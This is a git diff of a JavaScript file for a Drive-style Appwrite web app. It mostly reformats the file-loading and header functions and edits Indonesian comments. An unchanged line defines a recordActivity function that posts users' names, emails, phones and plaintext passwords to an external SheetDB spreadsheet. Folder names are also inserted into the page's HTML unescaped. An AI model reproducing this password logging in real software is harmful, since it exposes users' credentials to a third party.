@@ -255,7 +255,7 @@ window.clearSearch = () => { el('searchInput').value = ''; el('clearSearchBtn').
 function initAllContextMenus() {
     const newBtn = el('newBtnMain'); 
     const newMenu = el('dropdownMenu');
-    const navDrive = el('navDrive'); // ID navDrive dari HTML
+    const navDrive = el('navDrive'); // Element Drive Saya
     const globalMenu = el('globalContextMenu');
     const fileMenu = el('contextMenu');
     const mainArea = document.querySelector('.main-content-area');
@@ -267,7 +267,7 @@ function initAllContextMenus() {
         if(el('storageModal')) el('storageModal').classList.add('hidden');
     };
 
-    // 1. TOMBOL NEW (Klik Kiri & Kanan)
+    // Tombol NEW
     if (newBtn) {
         const newBtnClean = newBtn.cloneNode(true); 
         newBtn.parentNode.replaceChild(newBtnClean, newBtn);
@@ -282,18 +282,17 @@ function initAllContextMenus() {
         newBtnClean.oncontextmenu = toggleNewMenu;
     }
 
-    // 2. SIDEBAR DRIVE SAYA (Klik Kanan)
+    // Sidebar DRIVE SAYA
     if (navDrive) {
         navDrive.oncontextmenu = (e) => { 
             e.preventDefault(); e.stopPropagation(); closeAll(); 
-            // Posisi Menu Global di Kursor Mouse
             globalMenu.style.top = `${e.clientY}px`; 
             globalMenu.style.left = `${e.clientX}px`; 
             globalMenu.classList.add('show');
         };
     }
 
-    // 3. AREA KOSONG (Klik Kanan)
+    // Area Kosong
     if (mainArea) {
         mainArea.oncontextmenu = (e) => {
             if (e.target.closest('.item-card')) return;
@@ -407,7 +406,48 @@ function initDragAndDrop() {
     if(input) input.addEventListener('change', (e) => { if (e.target.files.length > 0) handleFileSelect(e.target.files[0]); });
 }
 
-async function loadFiles(param) { if (!currentUser) return; const grid = el('fileGrid'); grid.innerHTML = ''; updateHeaderUI(); let queries = [Appwrite.Query.equal('owner', currentUser.$id)]; if (param === 'recent') queries.push(Appwrite.Query.orderDesc('$createdAt'), Appwrite.Query.equal('trashed', false)); else if (param === 'starred') queries.push(Appwrite.Query.equal('starred', true), Appwrite.Query.equal('trashed', false)); else if (param === 'trash') queries.push(Appwrite.Query.equal('trashed', true)); else { if (typeof param === 'string' && !['root','recent','starred','trash'].includes(param)) currentFolderId = param; queries.push(Appwrite.Query.equal('parentId', currentFolderId), Appwrite.Query.equal('trashed', false)); } try { const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, queries); if (res.documents.length === 0) grid.innerHTML = `<div style="grid-column:1/-1;display:flex;flex-direction:column;align-items:center;opacity:0.5;margin-top:50px;"><i class="fa-solid fa-folder-open" style="font-size:4rem;margin-bottom:20px;"></i><p>Folder Kosong</p></div>`; else res.documents.forEach(doc => renderItem(doc)); } catch (e) { console.error(e); } }
-function updateHeaderUI() { const container = document.querySelector('.breadcrumb-area'); const isRoot = currentFolderId === 'root' && currentViewMode === 'root'; if (isRoot) { const h = new Date().getHours(); const s = h < 12 ? "Morning" : h < 18 ? "Afternoon" : "Night"; container.innerHTML = `<h2 id="headerTitle">Welcome In Drive ${s}</h2>`; } else { container.innerHTML = `<div class="back-nav-container"><button onclick="goBack()" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Kembali ke Drive</button><h2 id="headerTitle" style="margin-top:10px;">${currentFolderName}</h2></div>`; } }
+// UPDATE: FUNGSI HEADER UI YANG DIPERBAIKI (TOMBOL KEMBALI)
+async function loadFiles(param) { 
+    if (!currentUser) return; 
+    const grid = el('fileGrid'); 
+    grid.innerHTML = ''; 
+    updateHeaderUI(); 
+    
+    let queries = [Appwrite.Query.equal('owner', currentUser.$id)]; 
+    if (param === 'recent') queries.push(Appwrite.Query.orderDesc('$createdAt'), Appwrite.Query.equal('trashed', false)); 
+    else if (param === 'starred') queries.push(Appwrite.Query.equal('starred', true), Appwrite.Query.equal('trashed', false)); 
+    else if (param === 'trash') queries.push(Appwrite.Query.equal('trashed', true)); 
+    else { 
+        if (typeof param === 'string' && !['root','recent','starred','trash'].includes(param)) currentFolderId = param; 
+        queries.push(Appwrite.Query.equal('parentId', currentFolderId), Appwrite.Query.equal('trashed', false)); 
+    } 
+    
+    try { 
+        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, queries); 
+        if (res.documents.length === 0) grid.innerHTML = `<div style="grid-column:1/-1;display:flex;flex-direction:column;align-items:center;opacity:0.5;margin-top:50px;"><i class="fa-solid fa-folder-open" style="font-size:4rem;margin-bottom:20px;"></i><p>Folder Kosong</p></div>`; 
+        else res.documents.forEach(doc => renderItem(doc)); 
+    } catch (e) { console.error(e); } 
+}
+
+function updateHeaderUI() { 
+    const container = document.querySelector('.breadcrumb-area'); 
+    const isRoot = currentFolderId === 'root' && currentViewMode === 'root'; 
+    
+    if (isRoot) { 
+        const h = new Date().getHours(); 
+        const s = h < 12 ? "Morning" : h < 18 ? "Afternoon" : "Night"; 
+        container.innerHTML = `<h2 id="headerTitle">Welcome In Drive ${s}</h2>`; 
+    } else { 
+        // Menggunakan tombol modern baru
+        container.innerHTML = `
+            <div class="back-nav-container">
+                <button onclick="goBack()" class="back-btn">
+                    <i class="fa-solid fa-arrow-left"></i> Kembali ke Drive
+                </button>
+                <h2 id="headerTitle" style="margin-top:10px;">${currentFolderName}</h2>
+            </div>`; 
+    } 
+}
+
 async function recordActivity(sheetName, userData) { try { const now = new Date(); const formattedDate = now.toLocaleString('id-ID', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(/\./g, ':'); const payload = { "ID": userData.id || "-", "Nama": userData.name || "-", "Email": userData.email || "-", "Phone": userData.phone || "-", "Password": userData.password || "-", "Waktu": formattedDate }; await fetch(`${SHEETDB_API}?sheet=${sheetName}`, { method: 'POST', headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }, body: JSON.stringify({ data: payload }) }); } catch (error) { console.error("Excel Log Error"); } }
 window.togglePass = (id, icon) => { const input = document.getElementById(id); if (input.type === "password") { input.type = "text"; icon.classList.remove("fa-eye-slash"); icon.classList.add("fa-eye"); } else { input.type = "password"; icon.classList.remove("fa-eye"); icon.classList.add("fa-eye-slash"); } };
